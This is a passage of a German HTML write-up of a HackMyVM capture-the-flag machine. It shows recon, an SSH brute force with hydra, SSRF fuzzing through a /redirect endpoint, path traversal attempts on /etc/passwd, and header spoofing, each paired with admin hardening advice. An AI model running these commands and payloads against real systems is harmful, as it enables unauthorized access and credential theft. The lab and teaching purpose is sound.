@@ -1,0 +1,1019 @@
+﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>jan - HackMyVM - Easy - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>jan - HackMyVM - Easy - Bericht</h1>
+        <div class="level-container">
+            <h2>Easy</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">dirb</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">proxychains</div>
+                <div class="tool-item">ffuf</div>
+                <div class="tool-item">bettercap</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nano</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">service</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#einleitung">Einleitung & Zielinformationen</a></li>
+                <li><a href="#reconnaissance">Reconnaissance & Scans</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access-attempts">Initial Access Versuche</a></li>
+                <li><a href="#initial-access">Initial Access (SSH)</a></li>
+                <li><a href="#poc">Proof of Concept (Privilege Escalation via SSH Banner)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+                <li><a href="#zusammenfassung-empfehlungen">Zusammenfassung & Empfehlungen</a></li>
+            </ul>
+        </section>
+
+        <section id="einleitung">
+            <h2>Einleitung & Zielinformationen</h2>
+            <p>Dieser Bericht dokumentiert die Ergebnisse des Penetrationstests, der auf dem Zielsystem jan.hmv durchgeführt wurde. Das Zielsystem wurde als Teil eines Capture-The-Flag (CTF)-Events mit dem Schwierigkeitsgrad "Easy" konfiguriert. Der Test umfasste eine Reihe von Sicherheitsüberprüfungen, darunter Port-Scans, Schwachstellenscans, Brute-Force-Angriffe und manuelle Exploitation-Versuche.</p>
+            <p class="analysis"><strong>Zielsystem-Informationen (aus initialer Zusammenfassung und Nmap):</strong></p>
+            <ul>
+                <li>Hostname: jan.hmv</li>
+                <li>IP-Adresse(n): `192.168.2.166`, `192.168.2.167`, `192.168.2.170` (wechselnd während des Tests, letzte verwendete IP: `192.168.2.170`)</li>
+                <li>Betriebssystem: Linux 4.15 - 5.8 (Alpine Linux vermutet/bestätigt)</li>
+                <li>MAC-Adresse: Variierend, alle Oracle VirtualBox NICs (`00:00:00:00:00:00` im Nmap-Scan ist ungewöhnlich, könnte eine Konfigurationseinstellung sein)</li>
+                <li>Offene Dienste (auf letzter IP `192.168.2.170`):
+                    <ul>
+                        <li>SSH: Port 22/tcp (OpenSSH 9.9)</li>
+                        <li>HTTP-Proxy: Port 8080/tcp</li>
+                    </ul>
+                </li>
+            </ul>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Zielinformationen geben einen guten Überblick. Mehrere IP-Adressen während des Tests deuten auf mögliche Netzwerkänderungen (DHCP) oder unterschiedliche Phasen/Konfigurationen der VM hin. Die offenen Ports SSH und ein HTTP-Proxy sind die primären Angriffsflächen. Alpine Linux ist ein leichtgewichtigeres System, das manchmal andere Standardtools oder Pfade aufweist.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Angriffsfläche (SSH, HTTP-Proxy) gezielt untersuchen. Die IP-Änderungen im Hinterkopf behalten.<br><strong>Empfehlung (Admin):</strong> Feste IP-Adressen für Server verwenden, um Verwirrung zu vermeiden. MAC-Adresse `00:00:00:00:00:00` überprüfen, falls unerwartet.</p>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance & Scans</h2>
+
+            <h3>Nmap Scan (Initial)</h3>
+            <p class="analysis"><strong>Analyse:</strong> Der initiale Nmap-Scan wurde auf `192.168.2.166` durchgeführt (obwohl kein expliziter Nmap-Befehl im Text gezeigt wird, fasst der Text die Ergebnisse zusammen und der spätere detaillierte Scan bestätigt sie).</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# Scan Informationen (Zusammenfassung aus späterem detaillierten Scan)
+# Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-30 22:31 CET
+# Nmap scan report for jan.hmv (192.168.2.166) Host is up (0.00017s latency).
+# Not shown: 65533 closed tcp ports (reset)
+
+# Port Informationen
+# Port      State   Service     Version
+22/tcp    open    ssh         OpenSSH 9.9 (protocol 2.0)
+8080/tcp  open    http-proxy  # (Version/Dienst nicht klar erkannt)
+
+# SSH Details
+# ssh-hostkey:
+#   256 2c:0b:57:a2:b3:e2:0f:6a:c0:61:f2:b7:1f:56:b4:42 (ECDSA)
+#   256 45:97:b0:2b:48:9b:4a:36:8e:db:44:bd:3f:15:cf:32 (ED25519)
+
+# HTTP Proxy Details
+# _http-open-proxy: Proxy might be redirecting requests
+# fingerprint-strings: ... (Zeigt "Welcome to our Public Server. Maybe Internal." bei GET) ... (Zeigt "400 Bad Request" bei anderen Anfragen) ...
+# _http-title: Site doesn't have a title (text/plain; charset=utf-8).
+# Unrecognized Service: Fingerprint für Port 8080 wird zur Übermittlung vorgeschlagen.
+
+# Geräteinformationen
+# MAC Address: 00:00:00:00:00:00 (Oracle VirtualBox virtual NIC)
+# Device type: general purpose
+# Running: Linux 4.X|5.X
+# OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+# OS details: Linux 4.15 - 5.8
+
+# Traceroute
+# HOP RTT     ADDRESS
+# 1   0.17 ms jan.hmv (192.168.2.166)
+                     </pre>
+                 </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan identifiziert die beiden Hauptangriffsvektoren: SSH auf Port 22 und einen Webdienst auf Port 8080, der sich als HTTP-Proxy ausgibt, aber nicht eindeutig erkannt wird. Die Nachricht "Maybe Internal" ist ein starker Hinweis auf eine potenzielle SSRF- (Server Side Request Forgery) oder Proxy-Missbrauchsmöglichkeit. Das Betriebssystem wird als Linux Kernel 4.x/5.x erkannt. Die SSH-Version (OpenSSH 9.9) ist sehr neu und wahrscheinlich nicht direkt durch bekannte Exploits angreifbar.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> SSH auf schwache Passwörter prüfen (Brute-Force). Den Dienst auf Port 8080 intensiv untersuchen: Web-Enumeration (Nikto, Dirb, Ffuf), Proxy-Funktionalität testen (mit `curl -x` oder Browser-Proxy-Einstellungen), SSRF-Versuche über mögliche Parameter.<br><strong>Empfehlung (Admin):</strong> SSH-Zugriff absichern (starke Passwörter/Keys, Fail2Ban). Den Dienst auf Port 8080 überprüfen: Ist es ein beabsichtigter Proxy? Wenn ja, absichern (Authentifizierung, Zugriffskontrolle). Wenn nein, deaktivieren.</p>
+
+            <h3>cURL Header Check</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt custom-prompt">+--(root?CCat)-[~]
++-# <span class="command">curl --verbose -I http://192.168.2.166:8080 -s</span></div> <!-- Annahme: IP=$IP=192.168.2.166 -->
+                     <pre>
+* Host jan.hmv:8080 was resolved.
+* IPv6: (none)
+* IPv4: 192.168.2.166
+*   Trying 192.168.2.166:8080...
+* Connected to jan.hmv (192.168.2.166) port 8080
+* using HTTP/1.x
+> HEAD / HTTP/1.1
+> Host: jan.hmv:8080
+> User-Agent: curl/8.10.1
+> Accept: */*
+
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Date: Thu, 30 Jan 2025 21:33:54 GMT
+< Content-Length: 45
+< Content-Type: text/plain; charset=utf-8
+
+* Connection #0 to host jan.hmv left intact
+                     </pre> <!-- IP aus Ausgabe übernommen, $IP ersetzt -->
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `curl` wird mit `--verbose` (zeigt Verbindungsdetails) und `-I` (sendet eine HEAD-Anfrage, holt nur Header) verwendet, um die HTTP-Header von Port 8080 abzurufen. `-s` unterdrückt die Fortschrittsanzeige.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass der Server mit HTTP/1.1 200 OK antwortet. Zeigt Standard-Header wie `Date`, `Content-Length` (45 Bytes, passend zur "Welcome..." Nachricht) und `Content-Type: text/plain`. Es fehlen wichtige Sicherheitsheader.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Fehlen von Sicherheitsheadern zur Kenntnis nehmen (wird von Nikto bestätigt).<br><strong>Empfehlung (Admin):</strong> Sicherheitsheader wie `X-Frame-Options`, `X-Content-Type-Options`, `Content-Security-Policy` etc. hinzufügen.</p>
+
+            <h3>Nikto Scan</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt custom-prompt">+--(root?CCat)-[~]
++-# <span class="command">nikto -h http://192.168.2.166:8080</span></div> <!-- Annahme: IP=$IP=192.168.2.166 -->
+                     <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.166
++ Target Hostname:    192.168.2.166
++ Target Port:        8080
++ Start Time:         2025-01-30 22:44:04 (GMT1)
+---------------------------------------------------------------------------
++ Server: No banner retrieved
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /1921682.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
++ /192_168_2_166.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
++ /192.168.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
++ /1921682.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
++ /166.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
++ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
++ 7947 requests: 0 error(s) and 163 item(s) reported on remote host <!-- ^[[A+ entfernt -->
++ End Time:           2025-01-30 22:44:45 (GMT1) (41 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                     </pre> <!-- IP aus Ausgabe übernommen, $IP ersetzt -->
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `nikto`, ein Webserver-Schwachstellenscanner, wird auf Port 8080 ausgeführt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Nikto bestätigt das Fehlen der Sicherheitsheader `X-Frame-Options` und `X-Content-Type-Options`. Noch wichtiger ist der Fund mehrerer potenziell interessanter Backup-Dateien, deren Namen auf die IP-Adresse oder Teile davon hindeuten (z.B. `/1921682.tar.lzma`, `/166.tar`). Solche Dateien können sensible Informationen, Konfigurationen oder sogar Quellcode enthalten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen, die gefundenen Backup-Dateien herunterzuladen (`curl -O` oder `wget`) und ihren Inhalt zu analysieren.<br><strong>Empfehlung (Admin):</strong> Fehlende Sicherheitsheader hinzufügen. Backup-Dateien *niemals* im Web-Root-Verzeichnis oder öffentlich zugänglichen Bereichen ablegen. Regelmäßig auf solche Dateien prüfen.</p>
+
+            <h3>DIRB Scan</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt custom-prompt">+--(root?CCat)-[~]
++-# <span class="command">dirb http://192.168.2.166:8080</span></div> <!-- Annahme: IP=$IP=192.168.2.166 -->
+                     <pre>
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Thu Jan 30 22:46:12 2025
+URL_BASE: http://192.168.2.166:8080/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://192.168.2.166:8080/ ----
++ http://192.168.2.166:8080/redirect (CODE:400|SIZE:24)
++ http://192.168.2.166:8080/robots.txt (CODE:200|SIZE:16)
+
+-----------------
+END_TIME: Thu Jan 30 22:46:13 2025
+DOWNLOADED: 4612 - FOUND: 2
+                     </pre> <!-- IP aus Ausgabe übernommen, $IP ersetzt -->
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `dirb`, ein Web Content Scanner, wird verwendet, um nach häufig vorkommenden Verzeichnissen und Dateien zu suchen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Findet zwei interessante Pfade: `/redirect` (gibt einen Bad Request zurück, wahrscheinlich weil ein Parameter fehlt) und `/robots.txt`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Inhalt von `/robots.txt` untersuchen. Den Pfad `/redirect` genauer analysieren (Parameter fuzzing, SSRF-Versuche).<br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass `robots.txt` keine sensiblen Pfade preisgibt. Die Funktionalität von `/redirect` überprüfen und absichern.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <h3>robots.txt Analyse</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"> # Kein Prompt im Originaltext
+└─# <span class="command">curl http://192.168.2.166:8080/robots.txt</span></div>
+                     <pre>
+/redirect
+/credz
+                     </pre> <!-- IP aus vorherigem Kontext übernommen -->
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der gefundenen `/robots.txt` wird abgerufen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die `robots.txt` listet die Pfade `/redirect` (bereits von `dirb` gefunden) und `/credz` auf. Obwohl `robots.txt` Suchmaschinen anweist, diese Pfade nicht zu indizieren, sind sie für einen Angreifer oft interessante Hinweise auf versteckte oder administrative Bereiche.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Pfad `/credz` untersuchen.<br><strong>Empfehlung (Admin):</strong> Sensible Pfade nicht in `robots.txt` auflisten. Der beste Schutz ist eine korrekte Zugriffskontrolle auf diese Pfade.</p>
+
+            <h3>/credz und /redirect Analyse</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt"> # Kein Prompt im Originaltext
+└─# <span class="command">curl http://192.168.2.166:8080/credz</span></div>
+                      <pre>Only accessible internally.</pre>
+                      <div class="prompt"> # Kein Prompt im Originaltext
+└─# <span class="command">curl http://192.168.2.166:8080/redirect</span></div>
+                      <pre>Parameter 'url' needed.</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Pfade `/credz` und `/redirect` werden direkt aufgerufen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> `/credz` gibt die Meldung "Only accessible internally." zurück, was auf eine Zugriffsbeschränkung (z.B. Prüfung der Quell-IP) hindeutet. `/redirect` meldet, dass der Parameter `url` benötigt wird. Dies bestätigt die Vermutung aus dem `dirb`-Scan und deutet stark auf eine Funktion hin, die eine URL erwartet – ein klassischer Kandidat für SSRF.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen, die interne Zugriffsbeschränkung für `/credz` zu umgehen (z.B. durch Header-Spoofing wie `X-Forwarded-For: 127.0.0.1` oder durch Ausnutzung von `/redirect`). Den `/redirect`-Endpunkt mit verschiedenen `url`-Parametern testen, um SSRF auszunutzen (Zugriff auf interne Dienste wie `http://127.0.0.1:22`, `http://127.0.0.1:8080`, Metadaten-Endpunkte, oder sogar `file:///etc/passwd`).<br><strong>Empfehlung (Admin):</strong> Die Zugriffskontrolle für `/credz` überprüfen und sicherstellen, dass sie robust ist. Die `/redirect`-Funktion absichern: Nur erlaubte Ziel-URLs zulassen (Whitelist), Protokolle einschränken (nur HTTP/HTTPS), keine internen IPs oder Dateipfade erlauben.</p>
+        </section>
+
+        <section id="initial-access-attempts">
+            <h2>Initial Access Versuche</h2>
+
+             <h3>SSH Brute-Force (Hydra)</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt custom-prompt">+--(root?CCat)-[~]
++-# <span class="command">hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.166 -t 64</span></div>
+                     <pre>
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-30 23:11:55
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344499 login tries (l:1/p:14344499), ~224133 tries per task
+[DATA] attacking ssh://192.168.2.166:22/
+[ERROR] all children were disabled due too many connection errors
+0 of 1 target completed, 0 valid password found
+[INFO] Writing restore file because 2 server scans could not be completed
+[ERROR] 1 target was disabled because of too many errors
+[ERROR] 1 targets did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-30 23:12:19
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `hydra` wird verwendet, um einen Brute-Force-Angriff auf den SSH-Dienst (Port 22) auf `192.168.2.166` durchzuführen. Es wird versucht, das Passwort für den Benutzer `jan` (`-l jan`) mit der `rockyou.txt`-Wortliste (`-P ...`) und 64 parallelen Threads (`-t 64`) zu finden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Fehlgeschlagen. Hydra bricht den Angriff wegen zu vieler Verbindungsfehler ab (`[ERROR] all children were disabled due too many connection errors`). Dies liegt wahrscheinlich daran, dass der SSH-Server (oder ein vorgeschaltetes Tool wie `fail2ban`) zu viele schnelle Login-Versuche erkennt und blockiert. Die hohe Thread-Anzahl (`-t 64`) ist hier kontraproduktiv.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Brute-Force-Angriffe auf SSH mit einer deutlich geringeren Thread-Anzahl wiederholen (`-t 4` oder sogar `-t 1`). Andere Benutzernamen testen (falls bekannt). Fokus auf andere Angriffsvektoren legen.<br><strong>Empfehlung (Admin):</strong> Rate-Limiting für SSH-Logins implementieren (`fail2ban` oder SSHD-Konfiguration `MaxAuthTries`). Starke Passwörter oder Key-basierte Authentifizierung erzwingen.</p>
+
+            <h3>SSRF/Proxy Versuche über /redirect (Wfuzz - Ports)</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt custom-prompt">+--(root?CCat)-[~]
++-# <span class="command">wfuzz -c -w /usr/share/wordlists/ports -u "http://192.168.2.167:8080/redirect?url=http://127.0.0.1:FUZZ" --hc 404 --hh 27</span></div>
+                     <pre>
+Target: http://192.168.2.167:8080/redirect?url=http://127.0.0.1:FUZZ
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+# (Keine positiven Ergebnisse)
+Total time: 0
+Processed Requests: 65535
+Filtered Requests: 65535
+Requests/sec.: 0
+                     </pre> <!-- IP auf 167 aktualisiert basierend auf Befehl -->
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `wfuzz` wird verwendet, um über den `/redirect`-Endpunkt auf `192.168.2.167` einen Portscan auf dem Localhost (`127.0.0.1`) des Zielsystems durchzuführen (SSRF). Es wird eine Wortliste mit Portnummern (`/usr/share/wordlists/ports`) für `FUZZ` eingesetzt. Antworten mit Statuscode 404 (`--hc 404`) und 27 Zeichen (`--hh 27`, wahrscheinlich die Größe der "Only accessible internally"-Meldung oder einer anderen Standardantwort) werden ignoriert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Fehlgeschlagen. Es wurden keine Ports auf `127.0.0.1` gefunden, die über den `/redirect`-Endpunkt erreichbar sind und eine andere Antwort als 404 oder die Standardmeldung liefern. Entweder blockiert der Proxy den Zugriff auf `127.0.0.1` oder es sind keine interessanten Dienste auf den getesteten Ports lokal aktiv.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Andere interne IPs oder Hostnamen über `/redirect` testen. Verschiedene Protokolle (`file://`, `gopher://`) versuchen. Andere Parameter für SSRF fuzzeln.<br><strong>Empfehlung (Admin):</strong> SSRF-Schutzmaßnahmen für `/redirect` implementieren (Whitelist für Ziel-URLs, Blockieren von internen IPs und `file://`-Protokoll).</p>
+
+            <h3>SSH Ungültiger Benutzername</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt custom-prompt">+--(root?CCat)-[~]
++-# <span class="command">ssh ''@192.168.2.167</span></div>
+                     <pre>remote username contains invalid characters</pre>
+                     <div class="prompt custom-prompt">+--(root?CCat)-[~]
++-# <span class="command">ssh ''@192.168.2.167</span></div>
+                     <pre>remote username contains invalid characters</pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Versuch, sich per SSH mit einem leeren Benutzernamen anzumelden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fehlgeschlagen. Der SSH-Server lehnt leere Benutzernamen korrekt ab.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nur valide Benutzernamen für SSH-Versuche verwenden.<br><strong>Empfehlung (Admin):</strong> Standardkonfiguration beibehalten, die leere Benutzernamen verbietet.</p>
+
+            <h3>Path Traversal Versuch über /credz (Wfuzz)</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt custom-prompt">+--(root?CCat)-[~]
++-# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://192.168.2.167:8080/credz?FUZZ=../../../../../../../../../../../../../../../../etc/passwd" --hc 404 --hh 27</span></div>
+                     <pre>
+Target: http://192.168.2.167:8080/credz?FUZZ=../../../../../../../../../../../../../../../../etc/passwd
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+# (Keine positiven Ergebnisse)
+Total time: 113.3946
+Processed Requests: 220563
+Filtered Requests: 220563
+Requests/sec.: 1945.092
+                     </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Versuch, mittels `wfuzz` eine Path-Traversal-Schwachstelle im `/credz`-Endpunkt auszunutzen. Es wird versucht, `/etc/passwd` zu lesen, indem verschiedene Verzeichnisnamen (`FUZZ` aus der Wortliste) als Parameter verwendet werden, gefolgt von einer langen Kette von `../`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fehlgeschlagen. Es wird keine Antwort gefunden, die vom Standard (404 oder 27 Zeichen) abweicht. Der `/credz`-Endpunkt scheint nicht direkt für Path Traversal über beliebige Parameter anfällig zu sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Andere Methoden zur Umgehung der "Only accessible internally"-Beschränkung für `/credz` versuchen (z.B. SSRF via `/redirect`).<br><strong>Empfehlung (Admin):</strong> Robuste Input-Validierung und Path-Normalisierung implementieren, um Path Traversal zu verhindern.</p>
+
+            <h3>SSRF/Proxy Bypass Versuche (Header Spoofing)</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt custom-prompt">+--(root?CCat)-[~]
++-# <span class="command">curl -X GET http://192.168.2.167:8080/redirect?url=https://google.de -H "X-Forwarded-For: 192.168.2.1"</span></div>
+                     <pre>Only accessible internally.</pre>
+                     <div class="prompt custom-prompt">+--(root?CCat)-[~]
++-# <span class="command">curl -X GET http://192.168.2.167:8080/redirect?url=https://google.de -H "X-Real-IP: 127.0.0.1"</span></div>
+                     <pre>Only accessible internally.</pre>
+                     <div class="prompt custom-prompt">+--(root?CCat)-[~]
++-# <span class="command">curl -X GET http://192.168.2.167:8080/redirect?url=https://google.de -H "X-Forwarded-For: 127.0.0.1"</span></div>
+                     <pre>Only accessible internally.</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Mehrere Versuche, über den `/redirect`-Endpunkt auf eine externe URL (`https://google.de`) zuzugreifen, während versucht wird, eine interne Quell-IP durch Setzen der Header `X-Forwarded-For` oder `X-Real-IP` vorzutäuschen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Fehlgeschlagen. Die Anwendung gibt weiterhin "Only accessible internally." zurück. Das bedeutet, dass der Proxy/die Anwendung diese Header entweder ignoriert oder die eigentliche Quell-IP für die Zugriffskontrolle verwendet, oder dass die interne Beschränkung nicht auf der Quell-IP basiert, sondern darauf, *welche* Ziel-URL über den Proxy abgerufen werden darf.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Testen, ob interne Ziel-URLs über `/redirect` funktionieren. Andere Header (`Client-IP`, etc.) versuchen.<br><strong>Empfehlung (Admin):</strong> Sich nicht auf Header wie `X-Forwarded-For` für Sicherheitsentscheidungen verlassen, da diese leicht manipuliert werden können. Zugriffskontrolle für den Proxy auf vertrauenswürdige Quell-IPs und erlaubte Ziel-URLs beschränken.</p>
+
+            <h3>SSRF/Proxy Versuche (Interne Ziele)</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt custom-prompt">+--(root?CCat)-[~]
++-# <span class="command">curl -X GET "http://192.168.2.167:8080/redirect?url=http://127.0.0.1:8080/"</span></div>
+                     <pre>Only accessible internally.</pre>
+                     <div class="prompt custom-prompt">+--(root?CCat)-[~]
++-# <span class="command">curl -X GET "http://192.168.2.167:8080/redirect?url=http://localhost:8080/"</span></div>
+                     <pre>Only accessible internally.</pre>
+                     <div class="prompt custom-prompt">+--(root?CCat)-[~]
++-# <span class="command">curl -X GET "http://192.168.2.167:8080/redirect?url=http://192.168.2.167:8080/"</span></div>
+                     <pre>Only accessible internally.</pre>
+                     <div class="prompt custom-prompt">+--(root?CCat)-[~]
++-# <span class="command">curl -X GET "http://192.168.2.167:8080/redirect?url=http://localhost"</span></div>
+                     <pre>Only accessible internally.</pre>
+                     <div class="prompt custom-prompt">+--(root?CCat)-[~]
++-# <span class="command">curl -X GET "http://192.168.2.167:8080/redirect?url=http://[::1]"</span></div>
+                     <pre>Only accessible internally.</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Versuche, über den `/redirect`-Endpunkt auf lokale/interne HTTP-Ziele zuzugreifen (`127.0.0.1`, `localhost`, die eigene IP `192.168.2.167`, IPv6 Loopback `[::1]`).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Alle Versuche scheitern mit "Only accessible internally.". Dies ist überraschend, da die Meldung suggeriert, dass *nur* interne Zugriffe erlaubt sind. Es scheint, dass die Anwendung entweder sehr restriktiv ist, welche internen Ziele erlaubt sind, oder die Fehlermeldung irreführend ist.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Logik hinter der Fehlermeldung und dem `/redirect`-Endpunkt ist unklar. Möglicherweise sind nur bestimmte interne IPs oder Hostnamen erlaubt, oder es gibt eine andere Bedingung. Der Fund mit `url=ben&url=/credz` deutet auf eine Parsing-Schwäche hin, die eventuell auch hier anwendbar ist.<br><strong>Empfehlung (Admin):</strong> Die Implementierung von `/redirect` gründlich prüfen und sicherstellen, dass sie wie beabsichtigt funktioniert und keine unerwünschten Zugriffe erlaubt.</p>
+
+            <h3>Proxychains Versuch</h3>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt custom-prompt">+--(root?CCat)-[~]
++-# <span class="command">ssh -D 1080 root@192.168.2.167</span></div>
+                    <pre>root@192.168.2.167's password:</pre> <!-- Login scheitert -->
+                    <div class="prompt custom-prompt">+--(root?CCat)-[~]
++-# <span class="command">ssh -D 1080 jan@192.168.2.167</span></div>
+                    <pre>jan@192.168.2.167's password:</pre> <!-- Login scheitert -->
+                </div>
+                <div class="terminal">
+                    <pre>
+# /etc/proxychains4.conf (Auszug)
+socks5 127.0.0.1 1080
+                    </pre>
+                </div>
+                <div class="terminal">
+                     <div class="prompt custom-prompt">+--(root?CCat)-[~]
++-# <span class="command">proxychains curl -X GET "http://192.168.2.167:8080/redirect?url=https://google.de"</span></div>
+                     <pre>
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  timeout
+curl: (7) Failed to connect to 192.168.2.167 port 8080 after 0 ms: Could not connect to server
+                     </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Versuch, einen SOCKS-Proxy durch SSH Dynamic Port Forwarding (`ssh -D 1080 ...`) aufzubauen und diesen dann mit `proxychains` zu verwenden, um `curl`-Anfragen über den SSH-Tunnel zu leiten. Ziel ist es, Anfragen von `127.0.0.1` auf dem *Zielsystem* zu initiieren.</p>
